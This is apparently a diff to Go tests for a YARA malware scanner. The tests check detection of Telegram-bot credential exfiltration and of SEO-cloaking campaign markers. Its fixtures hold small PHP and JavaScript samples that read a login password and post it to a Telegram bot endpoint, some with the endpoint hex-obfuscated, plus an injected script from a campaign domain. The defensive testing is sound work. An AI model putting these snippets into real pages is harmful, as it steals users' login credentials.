@@ -38,15 +38,62 @@ func TestTelegramExfil_ObfuscatedEndpointDetected(t *testing.T) {
 	}
 }
 
+func TestTelegramExfil_ObfuscatedEndpointWithPlainCredentialCapture(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`const endpoint="` + hexEscape("https://api.telegram.org/bot") + `";
+const method="` + hexEscape("sendMessage") + `";
+const password=document.getElementById("password").value;
+fetch(endpoint+method,{method:"POST",body:password});`)
+	if !hasYaraRule(s.ScanBytes(mal), "exfil_telegram_bot_credentials") {
+		t.Error("exfil_telegram_bot_credentials: escaped Telegram endpoint with plain credential capture not detected")
+	}
+}
+
 func TestTelegramExfil_HardcodedTokenWithCredentialCapture(t *testing.T) {
 	s := loadRepoYaraScanner(t)
-	mal := []byte(`<?php
-$token = "https://api.telegram.org/bot7206520169:AAEOSycSlMRM2t33oPFl8MB1Hd7ALDUCcts/sendMessage";
+	for _, mal := range [][]byte{[]byte(`<?php
+$token = "https://api.telegram.org/bot1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage";
 $msg = "user: " . $_POST['user'] . " password: " . $_POST['password'];
-file_get_contents($token . "?chat_id=-1002456099969&text=" . urlencode($msg));
-`)
-	if !hasYaraRule(s.ScanBytes(mal), "exfil_telegram_bot_credentials") {
-		t.Error("exfil_telegram_bot_credentials: hardcoded bot token harvesting credentials not detected")
+file_get_contents($token . "?chat_id=-1001234567890&text=" . urlencode($msg));
+`), []byte(`
+<script>
+const endpoint="https://api.telegram.org/bot1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage";
+const password=document.forms["login"]["password"].value;
+fetch(endpoint,{method:"POST",body:password});
+</script>
+`)} {
+		if !hasYaraRule(s.ScanBytes(mal), "exfil_telegram_bot_credentials") {
+			t.Error("exfil_telegram_bot_credentials: hardcoded bot token harvesting credentials not detected")
+		}
+	}
+}
+
+func TestTelegramExfil_HardcodedNotificationTokenNotFlagged(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	for _, legit := range [][]byte{[]byte(`<?php
+/* Plugin Name: Account Notifications */
+$url = "https://api.telegram.org/bot1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage";
+$text = "A user requested a password reset";
+wp_remote_post($url, array('body' => array('text' => $text)));
+`), []byte(`
+<form><input type="password" name="password"></form>
+<script>const endpoint="https://api.telegram.org/bot1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage";</script>
+`)} {
+		if hasYaraRule(s.ScanBytes(legit), "exfil_telegram_bot_credentials") {
+			t.Error("exfil_telegram_bot_credentials FP: matched a hardcoded notification bot or form declaration that captures no credentials")
+		}
+	}
+}
+
+func TestTelegramExfil_ObfuscatedNotificationEndpointNotFlagged(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	for _, legit := range [][]byte{
+		[]byte(`var endpoint="` + hexEscape("https://api.telegram.org/bot") + `";var method="` + hexEscape("sendMessage") + `";`),
+		[]byte(`var endpoint="` + hexEscape("https://api.telegram.org/bot") + `";var method="` + hexEscape("sendMessage") + `";var text="` + hexEscape("password reset requested") + `";`),
+	} {
+		if hasYaraRule(s.ScanBytes(legit), "exfil_telegram_bot_credentials") {
+			t.Error("exfil_telegram_bot_credentials FP: obfuscated messaging endpoint without credential capture matched an exfiltration rule")
+		}
 	}
 }
 
@@ -88,9 +135,29 @@ func TestTelegramExfil_DocumentationMentionNotFlagged(t *testing.T) {
 
 func TestGroup14IOC_CampaignMarkersDetected(t *testing.T) {
 	s := loadRepoYaraScanner(t)
-	mal := []byte(`<?php $u = "/utf.php?key=" . $k; $s = "/self.php?v=" . $v; echo file_get_contents($u . $s);`)
+	mal := append([]byte{'M', 'Z'}, []byte("RegisterModule\x00agent-self: %s\x00/utf.php?key=")...)
 	if !hasYaraRule(s.ScanBytes(mal), "seo_cloak_group14_ioc") {
-		t.Error("seo_cloak_group14_ioc: campaign infrastructure markers not detected")
+		t.Error("seo_cloak_group14_ioc: native IIS module with campaign markers not detected")
+	}
+}
+
+func TestGroup14IOC_GenericEndpointPairNotFlagged(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	legit := []byte(`<?php
+$utf = "/utf.php?key=" . urlencode($key);
+$self = "/self.php?v=" . rawurlencode($version);
+echo json_encode(array('utf' => $utf, 'self' => $self));
+`)
+	if hasYaraRule(s.ScanBytes(legit), "seo_cloak_group14_ioc") {
+		t.Error("seo_cloak_group14_ioc FP: two generic endpoint paths without IIS-module or campaign infrastructure context matched")
+	}
+}
+
+func TestGroup14IOC_InjectedCampaignScriptDetected(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<script src='//speed.wlaspsd.co/a.js'></script><!-- /self.php?v= -->`)
+	if !hasYaraRule(s.ScanBytes(mal), "seo_cloak_group14_ioc") {
+		t.Error("seo_cloak_group14_ioc: injected campaign script with a second family marker not detected")
 	}
 }
 
